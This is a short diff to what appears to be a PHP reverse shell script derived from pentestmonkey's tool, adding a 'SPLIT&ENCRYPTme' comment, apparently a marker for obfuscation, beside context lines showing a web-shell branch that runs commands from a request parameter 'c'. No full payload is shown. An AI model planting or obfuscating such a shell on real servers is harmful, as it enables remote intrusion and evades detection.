@@ -44,7 +44,7 @@
 // Usage
 // -----
 // See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.
-// 
+//
 // Smart Improvements (by Gramthanos)
 // ----------------------------------
 // IP and Port definition from URL parameters or CMD arguments (PHP >= 4.3.0)
@@ -67,6 +67,7 @@ $debug = 0;
 $verbose = true;
 
 // DONT EDIT FROM THIS POINT ON
+// SPLIT&ENCRYPTme
 
 // Just run command
 if (isset($_REQUEST['c'])) {
